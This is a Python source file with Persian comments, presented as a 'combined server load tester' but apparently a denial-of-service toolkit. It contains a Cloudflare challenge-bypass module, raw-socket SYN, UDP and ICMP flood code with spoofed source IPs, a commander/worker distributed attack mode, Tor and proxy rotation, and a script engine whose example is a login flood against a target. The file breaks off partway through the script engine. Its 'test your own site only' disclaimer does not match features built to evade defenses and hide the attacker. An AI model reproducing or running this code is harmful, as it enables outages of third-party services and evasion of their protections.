#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     🔥 تست ترکیبی بار سرور v3 — Ultimate Edition                      ║
║                                                                           ║
║  ✅ Cloudflare Bypass (CFB) + Auto Challenge Solver                      ║
║  ✅ حملات Layer 3/4 (SYN Flood / UDP Flood / ICMP)                      ║
║  ✅ Distributed Mode (Commander + Worker)                                 ║
║  ✅ HTTP/2 با httpx (fallback به aiohttp)                                ║
║  ✅ Tor Integration + Proxy Rotation                                      ║
║  ✅ Scripting Engine (JSON-based)                                         ║
║  ✅ همه ویژگی‌های v2 (Keep-Alive, ViewState Cache, Weighted Targeting)   ║
║                                                                           ║
║  ⚠ فقط برای تست سایت خودتان!                                             ║
╚═══════════════════════════════════════════════════════════════════════════╝

نحوه استفاده:
  python combined_tester_v3.py                                    # اجرای مستقیم
  python combined_tester_v3.py --max-workers 2000                 # ورکر بیشتر
  python combined_tester_v3.py --slowloris                       # Slowloris
  python combined_tester_v3.py --cfb                             # Cloudflare Bypass
  python combined_tester_v3.py --tor                             # از Tor استفاده کن
  python combined_tester_v3.py --proxy-file proxies.txt          # پروکسی چرخشی
  python combined_tester_v3.py --http2                           # HTTP/2
  python combined_tester_v3.py --syn-flood                       # SYN Flood (نیاز به root)
  python combined_tester_v3.py --udp-flood                       # UDP Flood (نیاز به root)
  python combined_tester_v3.py --commander --port 9999           # حالت Commander
  python combined_tester_v3.py --worker commander-ip:9999        # حالت Worker
  python combined_tester_v3.py --script test_script.json         # اسکریپت سفارشی

نیازها:
  pip install aiohttp httpx[http2] aiohttp-socks
  # برای SYN/UDP: pip install scapy (نیاز به root)
"""

import asyncio
import argparse
import time
import statistics
import sys
import signal
import json
import random
import string
import re
import struct
import socket
import hashlib
import math
import os
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set, Tuple, Any
from collections import deque
from urllib.parse import urlparse, urljoin, urlencode

# ═══════════════════════════════════════════════════════════════════════════════
# Dependency Check — با کاهش تدریجی graceful
# ═══════════════════════════════════════════════════════════════════════════════

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False
    print("⚠ aiohttp نصب نیست: pip install aiohttp")

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from aiohttp_socks import ProxyConnector
    HAS_AIOHTTP_SOCKS = True
except ImportError:
    HAS_AIOHTTP_SOCKS = False

try:
    import socks as pysocks
    HAS_PYSOCKS = True
except ImportError:
    HAS_PYSOCKS = False

if not HAS_AIOHTTP:
    print("خطا: حداقل aiohttp باید نصب باشه!")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# رنگ‌ها
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ═══════════════════════════════════════════════════════════════════════════════
# User-Agent — لیست بزرگ‌تر
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Vivaldi/6.5",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


# ═══════════════════════════════════════════════════════════════════════════════
# توابع کمکی
# ═══════════════════════════════════════════════════════════════════════════════

def rand_user(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def rand_pass(length=10):
    chars = string.ascii_letters + string.digits + "!@#$%"
    return ''.join(random.choices(chars, k=length))

def rand_cache_bust() -> str:
    return f"_={random.randint(100000, 999999)}"


# ═══════════════════════════════════════════════════════════════════════════════
# 🛡️ ماژول ۱: Cloudflare Bypass
# ═══════════════════════════════════════════════════════════════════════════════

class CloudflareBypass:
    """
    دور زدن Cloudflare "I'm Under Attack" Mode
    
    روش کار:
    1. درخواست اول → 503 + JS Challenge
    2. پارامترهای چالش رو استخراج می‌کنه (jschl_vc, pass, md ответ)
    3. فرمول JS رو در Python محاسبه می‌کنه
    4. کوکی cf_clearance رو دریافت و کش می‌کنه
    """

    def __init__(self):
        self.cf_cookies: Dict[str, str] = {}  # domain → cf_clearance
        self.cf_cookie_ts: float = 0
        self.cf_cookie_ttl: float = 1800  # 30 دقیقه
        self.solved_count: int = 0
        self.fail_count: int = 0

    def is_cf_challenge(self, status: int, body: str, headers: dict) -> bool:
        """تشخیص صفحه چالش Cloudflare"""
        if status != 503:
            return False
        cf_ray = headers.get('CF-Ray', '') if headers else ''
        cf_chl_bypass = headers.get('cf-chl-bypass', '') if headers else ''
        indicators = [
            'cf-browser-verification',
            'cf_chl_opt',
            'challenge-platform',
            'Checking your browser',
            'Please Wait... | Cloudflare',
            'Enable JavaScript and cookies to continue',
            '_cf_chl_opt',
            'cf-challenge-run',
        ]
        body_lower = body.lower() if body else ''
        for ind in indicators:
            if ind.lower() in body_lower:
                return True
        if cf_ray and status == 503:
            return True
        return False

    def _extract_challenge_params(self, body: str) -> Optional[Dict[str, str]]:
        """استخراج پارامترهای چالش CF"""
        params = {}

        # استخراج _cf_chl_opt
        opt_match = re.search(r'_cf_chl_opt\s*=\s*\{([^}]+)\}', body)
        if opt_match:
            opt_text = opt_match.group(1)
            for key_match in re.finditer(r"(\w+)\s*:\s*'([^']*)'", opt_text):
                params[key_match.group(1)] = key_match.group(2)
            for key_match in re.finditer(r'(\w+)\s*:\s*"([^"]*)"', opt_text):
                params[key_match.group(1)] = key_match.group(2)

        # استخراج jschl_vc
        vc_match = re.search(r'name="jschl_vc"\s*value="([^"]*)"', body)
        if vc_match:
            params['jschl_vc'] = vc_match.group(1)

        # استخراج pass
        pass_match = re.search(r'name="pass"\s*value="([^"]*)"', body)
        if pass_match:
            params['pass'] = pass_match.group(1)

        # استخراج s (UCF parameter)
        s_match = re.search(r'name="s"\s*value="([^"]*)"', body)
        if s_match:
            params['s'] = s_match.group(1)

        return params if params else None

    def _solve_js_challenge(self, body: str, domain: str) -> Optional[float]:
        """
        حل چالش JS ساده Cloudflare
        فرمول معمول: jschl_answer = solving_function(challenge) + domain.length
        """
        try:
            # الگوی قدیمی CF: setTimeout(function(){...}, 4000)
            # پیدا کردن فرمول محاسباتی
            challenge_pattern = re.search(
                r'var\s+s\s*,\s*t\s*,\s*o\s*,\s*p\s*,\s*b\s*,\s*r\s*,\s*e\s*,\s*a\s*;\s*(.+?)f\.submit',
                body, re.DOTALL
            )
            if not challenge_pattern:
                # الگوی جدید‌تر
                challenge_pattern = re.search(
                    r't\s*=\s*[a-z]+\.[a-z]+\([^)]+\);\s*(.+?)document\.getElementById',
                    body, re.DOTALL
                )

            if not challenge_pattern:
                return None

            js_code = challenge_pattern.group(1)

            # تبدیل ساده JS → Python
            # جایگزینی توابع JS با معادل Python
            replacements = {
                'Math.floor': 'math.floor',
                'Math.ceil': 'math.ceil',
                'Math.round': 'math.round',
                'Math.abs': 'abs',
                'parseInt': 'int',
                'parseFloat': 'float',
                '!![]': 'True',
                '![]': 'False',
                '[]': '0',
                '(!![])': '1',
                '(![])': '0',
                '+!![]': '+1',
                '+![]': '+0',
            }
            py_code = js_code
            for js, py in replacements.items():
                py_code = py_code.replace(js, py)

            # پاکسازی خطرناک
            if any(danger in py_code for danger in ['import', 'exec', 'eval', 'open', '__', 'os.']):
                return None

            # تلاش برای محاسبه
            try:
                local_vars = {'math': math, 'abs': abs, 'int': int, 'float': float, 'True': True, 'False': False}
                result = eval(py_code, {"__builtins__": {}}, local_vars)
                # اضافه کردن طول دامنه (الگوی قدیمی CF)
                result += len(domain)
                return float(result)
            except Exception:
                return None

        except Exception:
            return None

    async def solve_challenge(self, session, url: str, body: str, headers: dict) -> Optional[Dict[str, str]]:
        """حل کامل چالش Cloudflare و برگرداندن کوکی‌ها"""
        parsed = urlparse(url)
        domain = parsed.netloc.split(':')[0]

        try:
            # مرحله ۱: استخراج پارامترها
            params = self._extract_challenge_params(body)
            if not params:
                self.fail_count += 1
                return None

            # مرحله ۲: محاسبه جواب
            answer = self._solve_js_challenge(body, domain)
            if answer is None:
                # روش fallback: صبر و درخواست مجدد با کوکی‌های مرورگر
                await asyncio.sleep(5)
                self.fail_count += 1
                return None

            # مرحله ۳: ارسال جواب
            challenge_url = f"{parsed.scheme}://{parsed.netloc}/cdn-cgi/l/chk_jschl"
            form_data = {
                'jschl_vc': params.get('jschl_vc', ''),
                'pass': params.get('pass', ''),
                'jschl_answer': str(answer),
            }
            if 's' in params:
                form_data['s'] = params['s']

            cf_headers = {
                'User-Agent': random_ua(),
                'Referer': url,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
            }

            async with session.post(challenge_url, headers=cf_headers, data=form_data,
                                    ssl=False, allow_redirects=True) as resp:
                # مرحله ۴: استخراج cf_clearance
                cookies = {}
                for cookie in session.cookie_jar:
                    if cookie.key == 'cf_clearance':
                        cookies['cf_clearance'] = cookie.value
                        self.cf_cookies[domain] = cookie.value
                        self.cf_cookie_ts = time.time()
                        self.solved_count += 1
                        break

                return cookies if cookies else None

        except Exception:
            self.fail_count += 1
            return None

    def get_cached_cookies(self, domain: str) -> Optional[Dict[str, str]]:
        """دریافت کوکی‌های کش‌شده CF"""
        now = time.time()
        if now - self.cf_cookie_ts > self.cf_cookie_ttl:
            return None
        if domain in self.cf_cookies:
            return {'cf_clearance': self.cf_cookies[domain]}
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# 💥 ماژول ۲: حملات Layer 3/4 (SYN / UDP / ICMP)
# ═══════════════════════════════════════════════════════════════════════════════

class Layer34Attacker:
    """
    حملات لایه شبکه و ترابرد
    
    ⚠ نیاز به دسترسی root و raw socket
    ⚠ فقط برای تست شبکه خودتان!
    """

    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
        self._stop = asyncio.Event()
        self.stats = {'syn_sent': 0, 'udp_sent': 0, 'icmp_sent': 0, 'errors': 0}

    def stop(self):
        self._stop.set()

    @staticmethod
    def _checksum(data: bytes) -> int:
        """محاسبه checksum برای IP/TCP/UDP/ICMP"""
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    def _build_syn_packet(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> bytes:
        """ساخت پکت TCP SYN"""
        # IP Header (20 bytes)
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45,           # Version + IHL
            0,              # DSCP/ECN
            40,             # Total Length
            random.randint(0, 65535),  # Identification
            0x4000,         # Flags (Don't Fragment)
            64,             # TTL
            6,              # Protocol (TCP)
            0,              # Checksum (will calc)
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
        )
        ip_checksum = self._checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('!H', ip_checksum) + ip_header[12:]

        # TCP Header (20 bytes)
        tcp_header = struct.pack('!HHIIBBHHH',
            src_port,       # Source Port
            dst_port,       # Destination Port
            random.randint(0, 0xFFFFFFFF),  # Sequence Number
            0,              # Acknowledgment Number
            0x50,           # Data Offset (5 words = 20 bytes)
            0x02,           # Flags (SYN)
            65535,          # Window Size
            0,              # Checksum (will calc)
            0,              # Urgent Pointer
        )

        # TCP Pseudo Header for checksum
        pseudo = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
            0, 6, len(tcp_header))
        tcp_checksum = self._checksum(pseudo + tcp_header)
        tcp_header = tcp_header[:16] + struct.pack('!H', tcp_checksum) + tcp_header[18:]

        return ip_header + tcp_header

    def _build_udp_packet(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int, payload: bytes) -> bytes:
        """ساخت پکت UDP"""
        udp_length = 8 + len(payload)

        # UDP Header
        udp_header = struct.pack('!HHHH',
            src_port,
            dst_port,
            udp_length,
            0,  # Checksum (0 = disabled for IPv4)
        )

        # IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 20 + udp_length,
            random.randint(0, 65535), 0x4000, 64, 17, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
        )
        ip_checksum = self._checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('!H', ip_checksum) + ip_header[12:]

        return ip_header + udp_header + payload

    def _build_icmp_packet(self, dst_ip: str) -> bytes:
        """ساخت پکت ICMP Echo Request"""
        icmp_header = struct.pack('!BBHHH',
            8,          # Type (Echo Request)
            0,          # Code
            0,          # Checksum
            random.randint(0, 0xFFFF),  # Identifier
            random.randint(0, 0xFFFF),  # Sequence
        )
        # Payload تصادفی
        payload = os.urandom(56)
        checksum = self._checksum(icmp_header + payload)
        icmp_header = icmp_header[:2] + struct.pack('!H', checksum) + icmp_header[4:]

        # IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 20 + 8 + 56,
            random.randint(0, 65535), 0x4000, 64, 1, 0,
            socket.inet_aton(self._random_ip()), socket.inet_aton(dst_ip),
        )
        ip_checksum = self._checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('!H', ip_checksum) + ip_header[12:]

        return ip_header + icmp_header + payload

    @staticmethod
    def _random_ip() -> str:
        """تولید IP تصادفی برای Spoof"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    async def syn_flood(self, pps: int = 1000):
        """
        SYN Flood: ارسال حجم زیادی TCP SYN
        
        هر SYN = نیمه‌اتصال (half-open connection) در سرور
        سرور منتظر ACK می‌مونه و حافظه مصرف می‌کنه
        وقتی صف SYN نیمه‌باز پر بشه → سرور سایر اتصالات رو رد می‌کنه
        """
        if os.geteuid() != 0:
            print(f"  {C.R}❌ SYN Flood نیاز به دسترسی root دارد! (sudo){C.RS}")
            return

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"  {C.R}❌ دسترسی raw socket denied!{C.RS}")
            return

        print(f"  {C.R}💥 SYN Flood شروع شد → {self.target_ip}:{self.target_port} ({pps} pps){C.RS}")

        interval = 1.0 / pps
        while not self._stop.is_set():
            try:
                src_ip = self._random_ip()
                src_port = random.randint(1024, 65535)
                packet = self._build_syn_packet(src_ip, src_port, self.target_ip, self.target_port)
                raw_sock.sendto(packet, (self.target_ip, self.target_port))
                self.stats['syn_sent'] += 1
                if self.stats['syn_sent'] % 1000 == 0:
                    print(f"\r  SYN Flood: {self.stats['syn_sent']:,} packets sent", end="", flush=True)
                await asyncio.sleep(interval)
            except Exception:
                self.stats['errors'] += 1
                await asyncio.sleep(0.001)

        raw_sock.close()

    async def udp_flood(self, pps: int = 1000, payload_size: int = 1024):
        """
        UDP Flood: ارسال حجم زیادی پکت UDP
        
        هر پکت → سرور باید پردازش کنه
        پکت‌های بزرگ → مصرف پهنای باند سرور
        """
        if os.geteuid() != 0:
            print(f"  {C.R}❌ UDP Flood نیاز به دسترسی root دارد! (sudo){C.RS}")
            return

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"  {C.R}❌ دسترسی raw socket denied!{C.RS}")
            return

        print(f"  {C.R}💥 UDP Flood شروع شد → {self.target_ip}:{self.target_port} ({pps} pps, {payload_size}B){C.RS}")

        payload = os.urandom(payload_size)
        interval = 1.0 / pps

        while not self._stop.is_set():
            try:
                src_ip = self._random_ip()
                src_port = random.randint(1024, 65535)
                packet = self._build_udp_packet(src_ip, src_port, self.target_ip,
                                                 self.target_port, payload)
                raw_sock.sendto(packet, (self.target_ip, self.target_port))
                self.stats['udp_sent'] += 1
                if self.stats['udp_sent'] % 1000 == 0:
                    print(f"\r  UDP Flood: {self.stats['udp_sent']:,} packets sent", end="", flush=True)
                await asyncio.sleep(interval)
            except Exception:
                self.stats['errors'] += 1
                await asyncio.sleep(0.001)

        raw_sock.close()

    async def icmp_flood(self, pps: int = 500):
        """ICMP Flood: بمباران با Echo Request"""
        if os.geteuid() != 0:
            print(f"  {C.R}❌ ICMP Flood نیاز به دسترسی root دارد!{C.RS}")
            return

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            return

        print(f"  {C.R}💥 ICMP Flood شروع شد → {self.target_ip} ({pps} pps){C.RS}")

        interval = 1.0 / pps
        while not self._stop.is_set():
            try:
                packet = self._build_icmp_packet(self.target_ip)
                raw_sock.sendto(packet, (self.target_ip, 0))
                self.stats['icmp_sent'] += 1
                await asyncio.sleep(interval)
            except Exception:
                self.stats['errors'] += 1
                await asyncio.sleep(0.001)

        raw_sock.close()


# ═══════════════════════════════════════════════════════════════════════════════
# 🌐 ماژول ۳: Distributed Mode
# ═══════════════════════════════════════════════════════════════════════════════

DISTRIBUTED_PORT = 9876

class Commander:
    """
    Commander (سربرگ): هماهنگ‌کننده حمله توزیع‌شده
    
    پروتکل:
      Commander → Worker: {"type":"config", "url":"...", "workers":1000, ...}
      Commander → Worker: {"type":"start"}
      Commander → Worker: {"type":"stop"}
      Worker → Commander: {"type":"stats", "total":1234, "ok":1000, ...}
      Worker → Commander: {"type":"heartbeat", "id":"worker-1"}
    """

    def __init__(self, port: int = DISTRIBUTED_PORT):
        self.port = port
        self.workers: Dict[str, dict] = {}  # id → {transport, stats}
        self._stop = asyncio.Event()
        self.config: Dict[str, Any] = {}
        self.aggregated_stats = {
            'total': 0, 'ok': 0, 'fail': 0, 'rps': 0.0,
            'workers_online': 0,
        }

    def stop(self):
        self._stop.set()

    async def start(self, config: Dict[str, Any]):
        self.config = config
        server = await asyncio.start_server(
            self._handle_worker, '0.0.0.0', self.port
        )

        print(f"\n  {C.G}📡 Commander شروع شد روی پورت {self.port}{C.RS}")
        print(f"  {C.CY}⌨  Workerها باید وصل بشن:{C.RS}")
        print(f"     python combined_tester_v3.py --worker {self._get_local_ip()}:{self.port}")
        print(f"\n  {C.Y}منتظر اتصال Workerها... (Ctrl+C برای شروع){C.RS}")

        # منتظر Ctrl+C یا چند Worker
        try:
            while not self._stop.is_set():
                await asyncio.sleep(1)
                if len(self.workers) > 0:
                    print(f"\r  👥 {len(self.workers)} Worker وصل شده  ", end="", flush=True)
        except KeyboardInterrupt:
            pass

        # ارسال config به همه Workerها
        if self.workers:
            print(f"\n  {C.G}🚀 ارسال دستور شروع به {len(self.workers)} Worker...{C.RS}")
            await self._broadcast_config()
            await self._broadcast_start()

            # مانیتورینگ
            while not self._stop.is_set():
                self._update_aggregated()
                print(
                    f"\r  📡 Distributed │ 👥{len(self.workers)} │ "
                    f"📊{self.aggregated_stats['total']:,} │ "
                    f"✓{self.aggregated_stats['ok']:,} │ "
                    f"✗{self.aggregated_stats['fail']:,} │ "
                    f"⚡{self.aggregated_stats['rps']:.0f}/s ",
                    end="", flush=True
                )
                await asyncio.sleep(2)

        server.close()
        await server.wait_closed()

    async def _handle_worker(self, reader, writer):
        worker_id = f"worker-{len(self.workers)+1}"
        self.workers[worker_id] = {'reader': reader, 'writer': writer, 'stats': {}}
        addr = writer.get_extra_info('peername')
        print(f"\n  {C.G}✅ Worker وصل شد: {addr[0]} (id: {worker_id}){C.RS}")

        try:
            while not self._stop.is_set():
                data = await reader.read(4096)
                if not data:
                    break
                try:
                    msg = json.loads(data.decode())
                    if msg.get('type') == 'stats':
                        self.workers[worker_id]['stats'] = msg
                    elif msg.get('type') == 'heartbeat':
                        pass  # Worker زنده‌ست
                except json.JSONDecodeError:
                    pass
        except Exception:
            pass
        finally:
            if worker_id in self.workers:
                del self.workers[worker_id]
            print(f"\n  {C.Y}⚠ Worker قطع شد: {worker_id}{C.RS}")
            writer.close()

    async def _broadcast_config(self):
        msg = json.dumps({**self.config, 'type': 'config'}).encode()
        for wid, w in list(self.workers.items()):
            try:
                w['writer'].write(msg + b'\n')
                await w['writer'].drain()
            except Exception:
                pass

    async def _broadcast_start(self):
        msg = json.dumps({'type': 'start'}).encode()
        for wid, w in list(self.workers.items()):
            try:
                w['writer'].write(msg + b'\n')
                await w['writer'].drain()
            except Exception:
                pass

    def _update_aggregated(self):
        total = ok = fail = 0
        for w in self.workers.values():
            s = w.get('stats', {})
            total += s.get('total', 0)
            ok += s.get('ok', 0)
            fail += s.get('fail', 0)
        self.aggregated_stats = {
            'total': total, 'ok': ok, 'fail': fail,
            'rps': total / max(time.time() - self.config.get('t0', time.time()), 1),
            'workers_online': len(self.workers),
        }

    @staticmethod
    def _get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "0.0.0.0"


class Worker:
    """Worker: متصل به Commander، اجرای حمله بر اساس config دریافتی"""

    def __init__(self, commander_addr: str):
        parts = commander_addr.split(':')
        self.host = parts[0]
        self.port = int(parts[1]) if len(parts) > 1 else DISTRIBUTED_PORT
        self._stop = asyncio.Event()
        self.config: Dict[str, Any] = {}

    def stop(self):
        self._stop.set()

    async def start(self):
        print(f"  {C.CY}🔗 اتصال به Commander {self.host}:{self.port}...{C.RS}")

        try:
            reader, writer = await asyncio.open_connection(self.host, self.port)
        except Exception as e:
            print(f"  {C.R}❌ اتصال ناموفق: {e}{C.RS}")
            return

        print(f"  {C.G}✅ به Commander وصل شد! منتظر config...{C.RS}")

        # ارسال heartbeat
        async def send_heartbeat():
            while not self._stop.is_set():
                try:
                    msg = json.dumps({'type': 'heartbeat', 'id': 'worker'}).encode()
                    writer.write(msg + b'\n')
                    await writer.drain()
                    await asyncio.sleep(5)
                except Exception:
                    break

        asyncio.create_task(send_heartbeat())

        # دریافت config و اجرا
        try:
            started = False
            tester = None

            while not self._stop.is_set():
                data = await reader.read(8192)
                if not data:
                    break

                for line in data.decode().split('\n'):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        msg = json.loads(line)
                    except json.JSONDecodeError:
                        continue

                    if msg.get('type') == 'config':
                        self.config = msg
                        print(f"  {C.G}📋 Config دریافت شد: {msg.get('url', '?')}{C.RS}")

                    elif msg.get('type') == 'start' and not started:
                        started = True
                        print(f"  {C.R}🚀 شروع حمله!{C.RS}")
                        # اجرای tester در background
                        tester = CombinedTester(
                            login_url=self.config.get('url', ''),
                            timeout=self.config.get('timeout', 20),
                            safe_max=self.config.get('safe_max', 10000),
                            enable_slowloris=self.config.get('slowloris', False),
                            enable_cfb=self.config.get('cfb', False),
                            enable_http2=self.config.get('http2', False),
                            tor_enabled=self.config.get('tor', False),
                            proxy_file=self.config.get('proxy_file', None),
                        )
                        asyncio.create_task(tester.run(
                            max_workers=self.config.get('max_workers', 1000),
                            step=self.config.get('step', 100),
                            step_dur=self.config.get('step_dur', 5),
                        ))

                        # ارسال stats دوره‌ای
                        async def send_stats():
                            while not self._stop.is_set():
                                try:
                                    st = tester.stats
                                    stats_msg = json.dumps({
                                        'type': 'stats',
                                        'total': st.total,
                                        'ok': st.ok,
                                        'fail': st.fail,
                                        'rps': st.rrps,
                                    }).encode()
                                    writer.write(stats_msg + b'\n')
                                    await writer.drain()
                                except Exception:
                                    pass
                                await asyncio.sleep(2)

                        asyncio.create_task(send_stats())

                    elif msg.get('type') == 'stop':
                        if tester:
                            tester.stop()
                        self._stop.set()

        except Exception as e:
            print(f"  {C.R}❌ خطا: {e}{C.RS}")
        finally:
            writer.close()


# ═══════════════════════════════════════════════════════════════════════════════
# 📜 ماژول ۴: Scripting Engine
# ═══════════════════════════════════════════════════════════════════════════════

class ScriptEngine:
    """
    موتور اسکریپت‌نویسی سبک (مثل k6)
    
    فرمت JSON:
    {
      "name": "ASP.NET Login Flood",
      "base_url": "https://target.com",
      "steps": [
        {"action": "get", "path": "/Login.aspx", "extract": {"viewstate": "__VIEWSTATE"}},
        {"action": "post", "path": "/Login.aspx",
         "data": {"username": "{{rand_user}}", "password": "{{rand_pass}}"},
         "expect": [302, 200]}
      ],
      "loop": true,
      "delay_ms": 10
    }
    
    متغیرهای از پیش تعریف‌شده:
      {{rand_user}}  → نام کاربری تصادفی
      {{rand_pass}}  → رمز تصادفی
      {{rand_int}}   → عدد تصادفی
      {{timestamp}}  → زمان فعلی
      {{cache_bust}} → پارامتر کش‌شکن
    """

    BUILTIN_VARS = {
        'rand_user': lambda: rand_user(),
        'rand_pass': lambda: rand_pass(),
        'rand_int': lambda: str(random.randint(1, 999999)),
        'timestamp': lambda: str(int(time.time())),
        'cache_bust': lambda: rand_cache_bust(),
        'rand_email': lambda: f"{rand_user()}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}",
        'rand_phone': lambda: f"09{random.randint(100000000, 999999999)}",
    }

    def __init__(self, script_path: str):
        self.script_path = script_path
        self.script: Dict[str, Any] = {}
        self.variables: Dict[str, str] = {}
        self._load()

    def _load(self):
        with open(self.script_path, 'r', encoding='utf-8') as f:
            self.script = json.load(f)
        print(f"  {C.G}📜 اسکریپت بارگذاری شد: {self.script.get('name', 'Unnamed')}{C.RS}")
        steps = self.script.get('steps', [])
        print(f"  📋 تعداد مراحل: {len(steps)}")
        for i, step in enumerate(steps):
            print(f"     {i+1}. {step.get('action','?').upper()} {step.get('path','/')}")

    def _resolve_vars(self, text: str) -> str:
        """جایگزینی متغیرهای {{var}} با مقادیر واقعی"""
        if not isinstance(text, str):
            return text
        for var_name, var_func in self.BUILTIN_VARS.items():
            text = text.replace(f'{{{{{var_name}}}}}', var_func())
        for var_name, var_value in self.variables.items():
            text = text.replace(f'{{{{{var_name}}}}}', var_value)
        return text

    def _resolve_dict(self, data: Dict) -> Dict:
        """جایگزینی متغیرها در کل دیکشنری"""
        resolved = {}
        for k, v in data.items():
            if isinstance(v, str):
                resolved[k] = self._resolve_vars(v)
            elif isinstance(v, dict):
                resolved[k] = self._resolve_dict(v)
            else:
                resolved[k] = v
        return resolved

    async def execute_step(self, session, step: Dict) -> Tuple[bool, Optional[str], float]:
        """اجرای یک مرحله اسکریپت"""
        base_url = self.script.get('base_url', '')
        action = step.get('action', 'get').lower()
        path = self._resolve_vars(step.get('path', '/'))
        url = urljoin(base_url, path)

        t = time.time()
        try:
            if action == 'get':
                headers = {'User-Agent': random_ua(), 'Accept': '*/*', 'Connection': 'keep-alive'}
                async with session.get(url, headers=headers, ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t

                    # استخراج متغیرها
                    if 'extract' in step:
